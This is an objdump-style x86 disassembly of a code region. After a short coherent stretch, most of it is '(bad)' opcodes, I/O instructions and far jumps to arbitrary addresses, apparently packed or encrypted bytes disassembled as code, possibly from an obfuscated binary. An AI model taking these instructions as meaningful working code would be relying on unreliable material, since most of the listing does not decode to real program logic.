  418445:	mov    DWORD PTR [ebp-0x4c],edx
  418448:	mov    edx,DWORD PTR [ebp+0x8]
  41844b:	mov    ebx,DWORD PTR [ebp-0x48]
  41844e:	lea    edx,[ebx+edx*1+0x241fc1f]
  418455:	mov    DWORD PTR [ebp-0x48],edx
  418458:	mov    edx,DWORD PTR [ebp+0x8]
  41845b:	mov    ebx,0xfa5e15e2
  418460:	sub    ebx,edx
  418462:	add    ebx,DWORD PTR [ebp-0x44]
  418465:	mov    DWORD PTR [ebp-0x44],ebx
  418468:	mov    edx,DWORD PTR [ebp+0x8]
  41846b:	xor    edx,eax
  41846d:	add    edx,esi
  41846f:	jne    0x4183f8
  418475:	jmp    0x41cb94
  41847a:	jmp    0x41a7c3
  41847f:	adc    BYTE PTR [edi],cl
  418481:	lods   eax,DWORD PTR ds:[esi]
  418482:	fnsave [ebx-0x21]
  418485:	lock jae 0x41841c
  418488:	sbb    DWORD PTR [edx-0x4],ebx
  41848b:	fucomip st,st(0)
  41848d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41848e:	cmp    ah,cl
  418490:	xor    BYTE PTR [ebp+0x7c],bh
  418493:	inc    eax
  418494:	pop    edi
  418495:	jl     0x418513
  418497:	outs   dx,DWORD PTR ds:[esi]
  418498:	int3   
  418499:	test   DWORD PTR [edx-0x8],edi
  41849c:	repnz retf 
  41849e:	add    BYTE PTR [edx+0x72143fbd],cl
  4184a4:	xchg   DWORD PTR [esi+0x1c987685],edx
  4184aa:	or     ecx,DWORD PTR [ebx-0x1d]
  4184ad:	or     bh,bh
  4184af:	inc    ecx
  4184b0:	pop    es
  4184b1:	mov    cl,0x7d
  4184b3:	xor    al,0x95
  4184b5:	scas   al,BYTE PTR es:[edi]
  4184b6:	cwde   
  4184b7:	add    BYTE PTR [ecx-0x434c05b0],al
  4184bd:	adc    DWORD PTR [ebp-0x11],ebp
  4184c0:	adc    BYTE PTR ds:0x9bc9,dh
  4184c5:	dec    ebx
  4184c6:	sub    eax,0x9538606a
  4184cb:	sub    BYTE PTR [edi*8-0x42b7ac9a],bh
  4184d2:	lods   al,BYTE PTR ds:[esi]
  4184d3:	dec    ebp
  4184d4:	(bad)  
  4184d5:	lea    esi,[ecx-0x55a2777b]
  4184db:	mov    DWORD PTR [edx+0xfd398cd],edi
  4184e1:	sbb    esp,ecx
  4184e3:	jbe    0x41850c
  4184e5:	fmul   QWORD PTR [edi-0x7a2672ac]
  4184eb:	lods   eax,DWORD PTR ds:[esi]
  4184ec:	xor    eax,0x7ea3babf
  4184f1:	pushf  
  4184f2:	dec    ebx
  4184f3:	mov    ebp,0x12726029
  4184f8:	ins    DWORD PTR es:[edi],dx
  4184f9:	repnz pop edx
  4184fb:	jns    0x418572
  4184fd:	sbb    cl,al
  4184ff:	xchg   DWORD PTR [esi-0x3ea8a7dd],edx
  418505:	jl     0x418504
  418507:	add    dl,bl
  418509:	ror    BYTE PTR [eax-0x14],0x62
  41850d:	mov    DWORD PTR [ebx+0x8678d5],edi
  418513:	cmp    eax,0x3e08e288
  418518:	loope  0x4184c7
  41851a:	xor    al,0x5e
  41851c:	pop    ecx
  41851d:	popf   
  41851e:	ret    
  41851f:	lea    ebx,[edx+0x6b]
  418522:	pusha  
  418523:	fnsave [ebx+edi*2-0x55]
  418527:	jnp    0x418533
  418529:	mov    ds:0xe0d9d11f,al
  41852e:	(bad)  
  41852f:	int    0xe6
  418531:	jecxz  0x4184fe
  418533:	ret    0x928
  418536:	and    edx,DWORD PTR [edx]
  418538:	jmp    0x4184d7
  41853a:	imul   eax,esi,0xfffffff4
  41853d:	pop    es
  41853e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41853f:	or     dl,0xb3
  418542:	test   DWORD PTR [esi+edx*8+0x21dc0014],0xeda0d742
  41854d:	rol    BYTE PTR [ebx+0x793d5512],cl
  418553:	jmp    0x4184f8
  418555:	or     BYTE PTR [edx+0x35],0x14
  418559:	(bad)  
  41855a:	xor    esp,DWORD PTR [ebx+0x4f]
  41855d:	or     ecx,DWORD PTR [ebp-0x61]
  418560:	adc    al,0x6c
  418562:	retf   0xeb9f
  418565:	mov    ds:0x49d20649,eax
  41856a:	push   edi
  41856b:	add    BYTE PTR [ecx-0x2d],cl
  41856e:	out    0xc,eax
  418570:	in     al,dx
  418571:	hlt    
  418572:	pusha  
  418573:	sbb    eax,0x26e6d677
  418578:	rcr    DWORD PTR [esi],1
  41857a:	addr16 pop ecx
  41857c:	jmp    0x4185a2
  41857e:	(bad)  
  41857f:	(bad)  [edi+edi*2+0x6b]
  418583:	stc    
  418584:	(bad)  
  418585:	call   0x2c626699
  41858a:	or     bl,BYTE PTR [edx]
  41858c:	and    al,0x1f
  41858e:	push   cs
  41858f:	jne    0x41852e
  418591:	inc    ecx
  418592:	xor    al,0x3
  418594:	adc    ah,bh
  418596:	addr16 mov al,ds:0xb5f6
  41859a:	xchg   BYTE PTR [edi],ch
  41859c:	add    ah,0x77
  41859f:	(bad)  
  4185a1:	pop    esi
  4185a2:	scas   eax,DWORD PTR es:[edi]
  4185a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185a4:	icebp  
  4185a5:	pop    esi
  4185a6:	jp     0x418566
  4185a8:	retf   
  4185a9:	test   al,0xa7
  4185ab:	jbe    0x4185d4
  4185ad:	fidivr DWORD PTR [ebx-0x4353b2e9]
  4185b3:	rcr    DWORD PTR [esi-0x4e],1
  4185b6:	mov    ch,0xdd
  4185b8:	cs and dh,0x34
  4185bc:	sub    al,0x28
  4185be:	pop    es
  4185bf:	xor    edx,DWORD PTR [ecx+0x362ed6c1]
  4185c5:	scas   eax,DWORD PTR es:[edi]
  4185c6:	push   esp
  4185c7:	pop    ds
  4185c8:	popf   
  4185c9:	fdivr  DWORD PTR [ebx]
  4185cb:	dec    edi
  4185cc:	xor    ah,BYTE PTR [ebx+0x37d5d805]
  4185d2:	push   edi
  4185d3:	dec    ebx
  4185d4:	inc    esp
  4185d5:	lods   eax,DWORD PTR ds:[esi]
  4185d6:	test   al,0x8e
  4185d8:	scas   eax,DWORD PTR es:[edi]
  4185d9:	hlt    
  4185da:	adc    BYTE PTR [ebp+0x56ffebeb],ch
  4185e0:	(bad)  
  4185e1:	stos   DWORD PTR es:[edi],eax
  4185e2:	in     eax,0x38
  4185e4:	arpl   WORD PTR [esp+eiz*4-0x7a],sp
  4185e8:	mov    esi,0x73b61ac3
  4185ed:	xor    dl,BYTE PTR [esi+0xce11b54]
  4185f3:	ret    
  4185f4:	cs xor eax,0xb9672da5
  4185fa:	das    
  4185fb:	fcomp  DWORD PTR [ecx]
  4185fd:	push   ebx
  4185fe:	mov    al,ds:0x3bfa632d
  418603:	pop    eax
  418604:	fst    DWORD PTR [edx+0x47]
  418607:	fwait
  418608:	mov    DWORD PTR [ebp+0x34],edi
  41860b:	(bad)  
  41860c:	sub    al,0xd7
  41860e:	rcr    BYTE PTR [ebx+0x1b],1
  418611:	xor    BYTE PTR [ebx-0x58],0x33
  418615:	lahf   
  418616:	dec    esi
  418617:	sti    
  418618:	scas   al,BYTE PTR es:[edi]
  418619:	scas   eax,DWORD PTR es:[edi]
  41861a:	outs   dx,BYTE PTR ds:[esi]
  41861b:	and    al,0x1b
  41861d:	ror    BYTE PTR [esp+esi*1],1
  418620:	test   DWORD PTR [ecx-0xc],edx
  418623:	jg     0x41860c
  418625:	inc    ebx
  418626:	inc    ebx
  418627:	lods   eax,DWORD PTR ds:[esi]
  418628:	leave  
  418629:	(bad)  
  41862a:	xor    DWORD PTR [edi+0x21],edi
  41862d:	xor    DWORD PTR [esi+0x32ff7d7],edi
  418633:	pop    ecx
  418634:	hlt    
  418635:	jl     0x4185f1
  418637:	retf   0xb2b5
  41863a:	fs inc esp
  41863c:	leave  
  41863d:	outs   dx,DWORD PTR ds:[esi]
  41863e:	popa   
  41863f:	ds stos BYTE PTR es:[edi],al
  418641:	bound  eax,QWORD PTR [esi]
  418643:	mov    al,bh
  418645:	xor    DWORD PTR [ebx],esi
  418647:	and    ecx,DWORD PTR [ebp+0x68]
  41864a:	mov    ecx,0xd7a283a3
  41864f:	fbstp  TBYTE PTR [ebp-0x79]
  418652:	mov    dl,0x91
  418654:	out    0xec,eax
  418656:	and    eax,0xb9d7ed94
  41865b:	in     eax,dx
  41865c:	jnp    0x418685
  41865e:	cmp    eax,0xcadaaecb
  418663:	push   edx
  418664:	mov    ebx,es
  418666:	adc    BYTE PTR [esi+0x2c],0x74
  41866a:	js     0x41869f
  41866c:	jl     0x418627
  41866e:	jg     0x4186cd
  418670:	or     bh,al
  418672:	fild   DWORD PTR ds:0xa4ab72a
  418678:	cli    
  418679:	and    eax,0xc2b60225
  41867e:	sbb    bl,cl
  418680:	xor    al,0x5e
  418682:	(bad)  
  418683:	cdq    
  418684:	xchg   ecx,eax
  418685:	pop    ss
  418686:	push   0x42457e2e
  41868b:	sar    eax,cl
  41868d:	das    
  41868e:	lahf   
  41868f:	retf   0xf173
  418692:	rol    BYTE PTR [eax+0xd],cl
  418695:	pop    esi
  418696:	add    al,0x6b
  418698:	adc    al,0x98
  41869a:	out    0xaf,eax
  41869c:	jns    0x4186a6
  41869e:	dec    edx
  41869f:	inc    esp
  4186a0:	and    eax,0xb2e087af
  4186a5:	jns    0x4186a9
  4186a7:	sti    
  4186a8:	dec    eax
  4186aa:	bound  ebp,QWORD PTR [eax+0x5722e938]
  4186b0:	mov    al,ds:0xe613013e
  4186b5:	in     eax,dx
  4186b6:	mov    edi,0xaa66851f
  4186bb:	out    0x3b,eax
  4186bd:	dec    edx
  4186be:	inc    edx
  4186bf:	inc    eax
  4186c0:	neg    BYTE PTR [edi-0x99d098]
  4186c6:	lods   al,BYTE PTR ds:[esi]
  4186c7:	mov    ah,0x25
  4186c9:	pusha  
  4186ca:	fwait
  4186cb:	nop
  4186cc:	sub    al,0xb6
  4186ce:	aas    
  4186cf:	out    0xb9,al
  4186d1:	test   DWORD PTR [ebp-0x6a182413],ecx
  4186d7:	out    dx,al
  4186d8:	loopne 0x4186ae
  4186da:	loop   0x418755
  4186dc:	push   es
  4186dd:	lock xor BYTE PTR ds:0x909bd504,0x98
  4186e5:	jmp    0xe3ad:0xa4514303
  4186ec:	clc    
  4186ed:	ficomp WORD PTR [esi+eiz*2]
  4186f0:	fstp   DWORD PTR [ebx-0x6782d124]
  4186f6:	inc    edi
  4186f7:	ret    
  4186f8:	lahf   
  4186f9:	in     eax,0x1a
  4186fb:	mov    al,0x90
  4186fd:	outs   dx,BYTE PTR ds:[esi]
  4186fe:	add    cl,dl
  418700:	dec    ebp
  418701:	fsubr  DWORD PTR [eax]
  418703:	in     eax,dx
  418704:	outs   dx,BYTE PTR ds:[esi]
  418705:	cmp    eax,0x3c
  418708:	sub    al,0xa3
  41870a:	fild   WORD PTR [ebp+ecx*1-0x1b]
  41870e:	aaa    
  41870f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418710:	test   eax,0xbffc58e4
  418715:	cmp    BYTE PTR [ecx-0x3c],ah
  418718:	enter  0x46cb,0x2b
  41871c:	sub    al,0xfb
  41871f:	outs   dx,BYTE PTR ds:[esi]
  418720:	pop    edi
  418721:	ror    edi,1
  418723:	push   edx
  418724:	fmul   QWORD PTR [ebx+0x7cfeb79b]
  41872a:	ret    
  41872b:	inc    esi
  41872c:	jno    0x4186f9
  41872e:	loopne 0x41878b
  418730:	mov    esp,0xe758880a
  418735:	fwait
  418736:	ds pop ebx
  418738:	stos   BYTE PTR es:[edi],al
  418739:	outs   dx,BYTE PTR ds:[esi]
  41873b:	daa    
  41873c:	push   cs
  41873d:	jae    0x41872c
  41873f:	jmp    0x418700
  418741:	add    eax,0x4d8ab8f2
  418746:	int    0xb7
  418748:	scas   al,BYTE PTR es:[edi]
  418749:	and    al,0xdc
  41874b:	data16 std 
  41874d:	and    al,0x43
  41874f:	je     0x4187b0
  418751:	shr    DWORD PTR [eax+0x5fdefa2],0xc7
  418758:	stos   DWORD PTR es:[edi],eax
  418759:	sbb    ebx,DWORD PTR ds:0x19274b9e
  41875f:	call   0x52073463
  418764:	les    eax,FWORD PTR [ebx]
  418766:	mov    bh,BYTE PTR [ebx-0x3e]
  418769:	fdiv   st(0),st
  41876b:	fscale 
  41876d:	imul   edi,DWORD PTR [esi+0x71],0x3b1d47d1
  418774:	cmp    DWORD PTR [edi+0x3a63985a],0x22a4a541
  41877e:	ror    DWORD PTR [eax],cl
  418780:	mov    ecx,0x7621c55
  418785:	fs popaw 
  418788:	fist   DWORD PTR ds:0xa694609a
  41878e:	in     al,0x47
  418790:	adc    eax,0xd7439166
  418795:	pop    esp
  418796:	jecxz  0x418778
  418798:	or     eax,0x99971273
  41879d:	jmp    0xa8e1:0x75167b89
  4187a4:	(bad)  
  4187a5:	shl    BYTE PTR [edx+0x45],0x4
  4187a9:	push   edx
  4187aa:	mov    bh,0xe3
  4187ac:	lods   al,BYTE PTR ds:[esi]
  4187ad:	adc    eax,0xa1241caa
  4187b2:	lea    ecx,[esi+0x38]
  4187b5:	xor    al,0xf6
  4187b7:	sub    al,0x3b
  4187b9:	xlat   BYTE PTR ds:[ebx]
  4187ba:	hlt    
  4187bb:	jbe    0x4187e3
  4187bd:	cmp    ch,BYTE PTR [ecx+0x3c0871a8]
  4187c3:	loop   0x41879a
  4187c5:	daa    
  4187c6:	aam    0x9
  4187c8:	jge    0x418794
  4187ca:	or     al,0x15
  4187cc:	in     eax,0x6e
  4187ce:	out    0xa,al
  4187d0:	mov    ds:0x28d6f9d8,al
  4187d5:	loope  0x4187dd
  4187d7:	aam    0x8f
  4187d9:	mov    ch,0x33
  4187db:	(bad)  
  4187dc:	and    al,0x16
  4187de:	into   
  4187df:	jbe    0x4187ae
  4187e1:	outs   dx,DWORD PTR ds:[esi]
  4187e2:	mov    bh,0xe0
  4187e4:	enter  0x125,0x6e
  4187e8:	xor    eax,DWORD PTR [ebx]
  4187ea:	or     esp,ecx
  4187ec:	xor    BYTE PTR [ebx-0x2a],dh
  4187ef:	cmp    edi,DWORD PTR [edx]
  4187f1:	neg    DWORD PTR [ebx]
  4187f3:	nop
  4187f4:	mov    esp,0x12f7bc16
  4187f9:	test   al,0x91
  4187fb:	cli    
  4187fc:	rol    edi,0x3e
  4187ff:	ins    DWORD PTR es:[edi],dx
  418800:	mov    esp,0x2ae13e8e
  418805:	les    ebp,FWORD PTR [ecx]
  418807:	fild   DWORD PTR [ebx-0xeb2af3c]
  41880d:	imul   ebp,ebx,0xffffff8d
  418810:	inc    esi
  418811:	adc    al,0x4c
  418813:	repz adc ch,BYTE PTR [ebx+0x7b]
  418817:	es dec ebp
  418819:	aas    
  41881a:	pop    esi
  41881b:	ret    
  41881c:	call   0xf23:0xc9325dbb
  418823:	adc    BYTE PTR [esi-0x36],dl
  418826:	cwde   
  418827:	sub    dl,BYTE PTR [edx+0x24fffd2]
  41882d:	inc    edx
  41882e:	cmp    al,BYTE PTR [edx]
  418830:	outs   dx,BYTE PTR ds:[esi]
  418831:	stc    
  418832:	mov    cs,WORD PTR [eax-0x6a20a65a]
  418838:	sub    DWORD PTR ds:0x1fcc30df,edx
  41883e:	mov    esi,edx
  418840:	or     al,0x6a
  418842:	lahf   
  418843:	fadd   QWORD PTR [eax+0x16]
  418846:	dec    edx
  418847:	sar    ecx,0xd6
  41884a:	adc    ebp,DWORD PTR ds:0xad9f40cc
  418850:	mov    dl,0x1f
  418852:	fisubr WORD PTR [edx]
  418854:	cdq    
  418855:	jle    0x4188c3
  418857:	shl    DWORD PTR [ebp+0x20],cl
  41885a:	mov    DWORD PTR [edi],0x84d11f5a
  418860:	ds push ds
  418862:	ins    DWORD PTR es:[edi],dx
  418863:	sahf   
  418864:	pushf  
  418865:	out    dx,al
  418866:	mov    dh,0xa5
  418868:	or     edi,DWORD PTR [esi+0x535770af]
  41886e:	pop    esi
  41886f:	cmp    DWORD PTR [edx-0x3c],edx
  418872:	push   ss
  418873:	jl     0x418876
  418875:	mov    ebx,0x26f49b6e
  41887a:	adc    ebp,ebx
  41887c:	pop    edi
  41887d:	sti    
  41887e:	mov    WORD PTR [edx-0x7f2c6f64],?
  418884:	lock push cs
  418886:	dec    ebx
  418887:	jmp    0x50e:0x90534fec
  41888e:	push   eax
  41888f:	sbb    BYTE PTR [ebx-0x6dc2cf60],al
  418895:	int    0xbb
  418897:	hlt    
  418898:	push   0x4c
  41889a:	dec    esi
  41889b:	jl     0x418847
  41889d:	test   al,0xb
  41889f:	pushf  
  4188a0:	or     edi,ecx
  4188a2:	cwde   
  4188a3:	xchg   edi,eax
  4188a4:	sbb    DWORD PTR [eax],ebp
  4188a6:	push   edx
  4188a7:	or     eax,0x57685a48
  4188ac:	cmp    BYTE PTR [ebp-0x67],bl
  4188af:	hlt    
  4188b0:	stos   BYTE PTR es:[edi],al
  4188b1:	pusha  
  4188b2:	loopne 0x4188bb
  4188b4:	jmp    0x16ca:0x7932c2b1
  4188bb:	sbb    BYTE PTR [ebp-0x7ed4b7fc],ah
  4188c1:	sub    eax,0xcf152fcd
  4188c6:	dec    eax
  4188c7:	aad    0x52
  4188c9:	and    eax,0x521430a0
  4188ce:	xchg   ebx,eax
  4188cf:	mov    esp,0x57071715
  4188d4:	pop    ds
  4188d5:	scas   eax,DWORD PTR es:[edi]
  4188d6:	inc    ebp
  4188d7:	gs aaa 
  4188d9:	in     al,0xe8
  4188db:	in     eax,dx
  4188dc:	push   ebx
  4188dd:	hlt    
  4188de:	jmp    DWORD PTR [esi+esi*2+0x1014d8b3]
  4188e5:	fcmovb st,st(5)
  4188e7:	xchg   BYTE PTR [esi],dl
  4188e9:	pop    eax
  4188ea:	int    0x2b
  4188ec:	and    edi,DWORD PTR [esi+eax*8-0x387ada98]
  4188f3:	cmp    edi,ebx
  4188f5:	mov    esp,0x9128a86
  4188fa:	jb     0x418898
  4188fc:	iret   
  4188fd:	(bad)  
  4188fe:	in     al,0x4
  418900:	adc    BYTE PTR ds:0x951e2509,bl
  418906:	cmp    ah,BYTE PTR fs:[esi+0x7b]
  41890a:	pop    edx
  41890b:	icebp  
  41890c:	jns    0x418961
  41890e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41890f:	cmp    BYTE PTR [edx-0x40],ah
  418912:	pop    esi
  418913:	sub    eax,0xc51c4e47
  418918:	mov    esp,0xca22592c
  41891d:	sub    BYTE PTR [ecx-0x53],cl
  418920:	out    dx,al
  418921:	in     eax,dx
  418922:	or     bh,BYTE PTR [ebp+0xcd0a2a4]
  418928:	jae    0x6d3aa063
  41892e:	inc    eax
  41892f:	xchg   DWORD PTR [ebx-0xa97d224],ecx
  418935:	sti    
  418936:	xchg   esp,eax
  418937:	adc    al,BYTE PTR [eax+ebp*8-0x74]
  41893b:	xor    edi,DWORD PTR [eax+0x59]
  41893e:	inc    eax
  41893f:	repz pusha 
  418941:	(bad)  
  418942:	mov    dl,0x9
  418944:	stos   DWORD PTR es:[edi],eax
  418945:	sbb    al,0xb
  418947:	or     esi,edi
  418949:	push   0x6f
  41894b:	enter  0xc13a,0x57
  41894f:	and    ebp,DWORD PTR [edx]
  418951:	push   esi
  418952:	jbe    0x4189c3
  418954:	aas    
  418955:	ror    BYTE PTR ds:0x1d28d4a2,1
  41895b:	cmp    ch,BYTE PTR [esi+0x16]
  41895e:	cmp    eax,0xdea763a3
  418963:	jne    0x4188e6
  418965:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418966:	cmp    eax,0x5efbdfa1
  41896b:	lahf   
  41896c:	push   ebx
  41896d:	or     eax,0xf0b7f894
  418972:	mov    esi,0x110be392
  418977:	push   ss
  418978:	or     dl,al
  41897a:	mov    ecx,esi
  41897c:	outs   dx,DWORD PTR ds:[esi]
  41897d:	pop    eax
  41897e:	xchg   esi,eax
  41897f:	mov    eax,ds:0xc6ba6026
  418984:	jmp    0x944c:0xfecaddb1
  41898b:	cmp    esp,0x7a
  41898e:	and    cl,BYTE PTR [edi]
  418990:	cdq    
  418991:	outs   dx,BYTE PTR ds:[esi]
  418992:	mov    ah,0xc2
  418994:	pop    esp
  418995:	mov    esi,DWORD PTR [ebx-0x47b88315]
  41899b:	jae    0x418a11
  41899d:	icebp  
  41899e:	mov    dh,0x7b
  4189a0:	(bad)  
  4189a1:	mov    eax,ds:0x6e011018
  4189a6:	xor    esp,DWORD PTR [esi+0x31]
  4189a9:	fidivr DWORD PTR [edi+0x1ec1b67]
  4189af:	sbb    al,ah
  4189b1:	mov    ch,0x69
  4189b3:	adc    esp,DWORD PTR [edi+0x2d]
  4189b6:	clc    
  4189b7:	cdq    
  4189b8:	(bad)  
  4189b9:	fstp   DWORD PTR [eax*2+0x37e782a1]
  4189c0:	in     al,dx
  4189c1:	jle    0x4189ba
  4189c3:	icebp  
  4189c4:	inc    esp
  4189c5:	jge    0x418a04
  4189c7:	add    BYTE PTR [edi+0x38],dh
  4189ca:	outs   dx,DWORD PTR ds:[esi]
  4189cb:	mov    dh,0x11
  4189cd:	mov    ds:0x7e77ce0,al
  4189d2:	pop    ds
  4189d3:	mov    dl,al
  4189d5:	dec    edx
  4189d6:	inc    ebx
  4189d7:	mov    ch,0xea
  4189d9:	pusha  
  4189da:	loopne 0x418a44
  4189dc:	jb     0x4189dc
  4189de:	les    ecx,FWORD PTR ds:0x27289dcf
  4189e4:	xor    ecx,esi
  4189e6:	cmp    esp,DWORD PTR [edx-0x20]
  4189e9:	(bad)  
  4189ea:	into   
  4189eb:	lahf   
  4189ec:	test   BYTE PTR [esi-0x77dcbc3b],0xc6
  4189f3:	fsubr  QWORD PTR [esi]
  4189f5:	rcr    bl,0x3
  4189f8:	fadd   QWORD PTR [esp+esi*4-0x7b0bb521]
  4189ff:	xor    ah,BYTE PTR [esi-0x5c]
  418a02:	je     0x418a45
  418a04:	lea    esi,[ecx+0x57858ca7]
  418a0a:	(bad)  
  418a0b:	div    ah
  418a0d:	or     BYTE PTR [ecx-0x12],bl
  418a10:	fcmovnbe st,st(1)
  418a12:	xchg   esi,eax
  418a13:	xor    ah,BYTE PTR [edi-0x7af4cc3c]
  418a19:	dec    edi
  418a1a:	jmp    0x899b:0x3f3ec95e
  418a21:	imul   ecx,ebx,0x16
  418a24:	mov    edi,0xb954edb6
  418a29:	jge    0x4189f1
  418a2b:	test   eax,0x1f5bd50
  418a30:	mov    es,WORD PTR [eax+ebp*1-0xe]
  418a34:	or     dl,dl
  418a36:	push   ebx
  418a37:	gs jnp 0x4189fd
  418a3a:	jmp    0xc28d:0x5f8a85f5
  418a41:	imul   eax,DWORD PTR [ecx*4-0x6e2ec75c],0xa9bde251
  418a4c:	test   DWORD PTR [edx+esi*1],edi
  418a4f:	test   DWORD PTR [edx-0x75],edi
  418a52:	pop    ebx
  418a53:	xchg   ch,dl
  418a55:	lds    esi,FWORD PTR [ebx-0x675c3a27]
  418a5b:	jnp    0x4189fd
  418a5d:	pop    ebx
  418a5e:	and    BYTE PTR [edi+0x627fea2a],bh
  418a64:	int3   
  418a65:	push   eax
  418a66:	call   0xcbe5e18f
  418a6b:	je     0x418a71
  418a6d:	xchg   dh,dl
  418a6f:	xchg   esi,eax
  418a70:	sbb    eax,0x9544a160
  418a75:	jmp    0x92161214
  418a7a:	inc    ecx
  418a7b:	push   ss
  418a7c:	xchg   edx,eax
  418a7d:	(bad)  
  418a7e:	fld    st(1)
  418a80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a81:	sub    DWORD PTR [ebx],eax
  418a83:	(bad)  
  418a84:	retf   0x8485
  418a87:	jo     0x418a4d
  418a89:	add    dl,BYTE PTR [edi+esi*2+0x5719748b]
  418a90:	les    ebx,FWORD PTR [ebx+0x3a10a5cb]
  418a96:	dec    ebp
  418a97:	aad    0x19
  418a99:	push   esp
  418a9a:	or     ebp,edx
  418a9c:	push   edx
  418a9d:	inc    edi
  418a9e:	add    al,0x10
  418aa0:	enter  0x7045,0xa6
  418aa4:	je     0x418a9e
  418aa6:	cmp    DWORD PTR [eax-0x7cc5be08],eax
  418aac:	add    DWORD PTR [eax],ebx
  418aae:	test   al,0x92
  418ab0:	in     eax,dx
  418ab1:	leave  
  418ab2:	imul   ebx,ecx,0x12
  418ab5:	xchg   bl,bl
  418ab7:	in     eax,dx
  418ab8:	(bad)  
  418aba:	aad    0x80
  418abc:	cmc    
  418abd:	ret    0x303
  418ac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ac1:	imul   esi,DWORD PTR [edi-0x53],0x410923b9
  418ac8:	data16 into 
  418aca:	mov    bl,0x1a
  418acc:	shl    DWORD PTR [esi+ebp*4-0x7f213d98],cl
  418ad3:	mov    eax,DWORD PTR [ebp+0x37]
  418ad6:	sbb    BYTE PTR [edi+0x52],dh
  418ad9:	out    0x5,eax
  418adb:	pop    ebp
  418adc:	cmp    bl,dl
  418ade:	test   DWORD PTR [esi],edx
  418ae0:	and    ch,BYTE PTR [edi-0x3301df4a]
  418ae6:	ror    BYTE PTR [ebp-0x117e7b77],cl
  418aec:	jno    0x418a7b
  418aee:	xchg   esp,eax
  418aef:	mov    al,0x88
  418af1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418af2:	outs   dx,BYTE PTR ds:[esi]
  418af3:	dec    edx
  418af4:	popa   
  418af5:	dec    edx
  418af6:	pop    eax
  418af7:	or     eax,0x2626d7f8
  418afc:	mov    al,ds:0x26a7d9d3
  418b01:	fiadd  DWORD PTR [esi]
  418b03:	add    DWORD PTR [ebp+0x6f],ecx
  418b06:	fadd   QWORD PTR [esi]
  418b08:	mov    ecx,0x3231130f
  418b0d:	or     DWORD PTR [ebp+0x7ae5c63f],ebp
  418b13:	push   cs
  418b14:	and    edi,DWORD PTR [ebx+0x7a39ea8e]
  418b1a:	pop    edx
  418b1b:	mov    bh,0xfa
  418b1d:	jecxz  0x418ab3
  418b1f:	fwait
  418b20:	not    DWORD PTR [eax-0x68]
  418b23:	xor    BYTE PTR [edx-0xef91f56],ch
  418b29:	(bad)  
  418b2a:	adc    eax,0xfe7cb9c0
  418b2f:	mov    ecx,0xdb4bbf54
  418b34:	pop    ecx
  418b35:	cmp    ebp,edi
  418b37:	popa   
  418b38:	add    DWORD PTR [ebp+0x71],eax
  418b3b:	adc    al,0xe4
  418b3d:	mov    al,ds:0xf7701f7b
  418b42:	out    0xe8,eax
  418b44:	dec    ecx
  418b45:	sbb    al,0x2d
  418b47:	pop    es
  418b48:	xlat   BYTE PTR ds:[ebx]
  418b49:	cld    
  418b4a:	mov    eax,0xb2f5f1e3
  418b4f:	popa   
  418b50:	xor    eax,0x410dd06a
  418b55:	adc    BYTE PTR ds:0x85d5550a,0xb8
  418b5c:	scas   eax,DWORD PTR es:[edi]
  418b5d:	xchg   ecx,eax
  418b5e:	mov    gs,WORD PTR [esp+eiz*8-0x5dc3a631]
  418b65:	xchg   ebx,eax
  418b66:	leave  
  418b67:	sbb    al,0xfb
  418b69:	das    
  418b6a:	in     eax,dx
  418b6b:	cmp    ah,ah
  418b6d:	mov    ds:0x53400475,eax
  418b72:	xchg   edx,eax
  418b73:	xchg   BYTE PTR [ecx+0x7d],dl
  418b76:	adc    BYTE PTR [esi],dl
  418b78:	clc    
  418b79:	pop    ds
  418b7a:	fnsave [ebx+edx*4-0x32944fe2]
  418b81:	pfadd  mm7,QWORD PTR [eax]
  418b85:	xlat   BYTE PTR ds:[ebx]
  418b86:	xor    ebx,DWORD PTR [eax-0x4a3de329]
  418b8c:	popa   
  418b8d:	aad    0x48
  418b8f:	mov    eax,ds:0x83c82a47
  418b94:	icebp  
  418b95:	add    WORD PTR ds:0x62dd93d4,bp
  418b9c:	mov    ss,WORD PTR [eax+0x36]
  418b9f:	cmp    BYTE PTR [eax],0xce
  418ba2:	hlt    
  418ba3:	test   eax,edx
  418ba5:	add    eax,0x82a59335
  418baa:	pop    edi
  418bab:	cmp    BYTE PTR [ebp-0x2b],ah
  418bae:	or     al,0x0
  418bb0:	call   0x5b11afef
  418bb5:	or     BYTE PTR [edi-0x1b],0x50
  418bb9:	xor    BYTE PTR [ecx-0x77],bl
  418bbc:	arpl   bp,bx
  418bbe:	fidivr DWORD PTR [ebp+0x5b]
  418bc1:	sub    BYTE PTR [ebx],al
  418bc3:	add    ch,BYTE PTR [ebx+0x35]
  418bc6:	cs push es
  418bc8:	cmp    eax,0x413e0df7
  418bcd:	or     eax,0x7a3c4cd8
  418bd2:	and    DWORD PTR [edx+0x3293aba8],edx
  418bd8:	or     bl,cl
  418bda:	fiadd  DWORD PTR [edi-0x2c]
  418bdd:	add    bl,bl
  418bdf:	add    BYTE PTR [esi-0x7d],0xb0
  418be3:	mov    ds:0x258d2024,al
  418be8:	jb     0x418c4c
  418bea:	mov    ch,0x2c
  418bec:	(bad)  
  418bed:	out    dx,eax
  418bee:	or     cl,BYTE PTR [edi-0x22]
  418bf1:	mov    cl,ch
  418bf3:	inc    ebx
  418bf4:	dec    ebx
  418bf5:	pop    edx
  418bf6:	fsubp  st(2),st
  418bf8:	(bad)  
  418bf9:	xor    BYTE PTR [esp+ecx*2],bh
  418bfc:	inc    edi
  418bfd:	xchg   esp,eax
  418bfe:	and    DWORD PTR [edi+0x4366d1b3],eax
  418c04:	mov    eax,0x41eeb9a6
  418c09:	stos   BYTE PTR es:[edi],al
  418c0a:	shl    DWORD PTR [edi+edx*8-0x49],1
  418c0e:	pushf  
  418c0f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  418c11:	fbstp  TBYTE PTR [eax+0x66]
  418c14:	jns    0x418bac
  418c16:	jb     0x418c82
  418c18:	es rol esp,1
  418c1b:	cmp    cl,BYTE PTR [esi+0x1ae06a26]
  418c21:	int3   
